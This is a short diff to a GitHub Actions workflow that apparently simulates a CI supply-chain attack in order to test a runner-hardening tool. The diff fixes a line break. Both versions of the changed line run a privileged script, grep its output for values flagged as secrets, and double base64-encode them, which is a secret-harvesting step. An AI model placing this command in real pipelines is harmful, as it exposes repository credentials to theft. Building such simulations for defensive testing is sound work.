@@ -74,7 +74,8 @@ jobs:
           PYTHON_SCRIPT
           
           # Execute the script
-          sudo python3 tj.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0  pytorch-simulation:
+          sudo python3 tj.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0  
+  pytorch-simulation:
     runs-on: ubuntu-latest
     steps:
     - uses: prateek-stepsecurity/harden-runner@int
